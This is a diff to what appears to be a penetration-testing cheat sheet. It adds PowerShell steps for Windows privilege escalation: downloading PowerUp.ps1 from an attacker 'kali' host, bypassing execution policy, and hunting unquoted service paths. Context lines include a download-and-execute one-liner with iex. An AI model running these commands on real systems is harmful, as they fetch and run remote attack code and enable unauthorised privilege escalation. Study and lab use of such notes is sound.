@@ -18,5 +18,31 @@ powershell iex(New-Object Net.WebClient).DownloadString('http://ip/Invoke-PowerS
 powershell -c "(New-Object Net.WebClient).DownloadFile('http://ip/filename.ext','C:\filelocation\filename.ext')"
 ```
 
+```
+Start-Service GammaService
+```
 
+```
+Stop-Service GammaService
+```
+
+https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.3
+
+**Invoke-WebRequest**
+
+```
+iwr http://kali/PowerUp.ps1 -Outfile PowerUp.ps1
+```
+
+```
+powereshell -ep bypass
+```
+
+```
+..\PowerUp.ps1
+```
+
+```
+Get-UnquotedService
+```
 
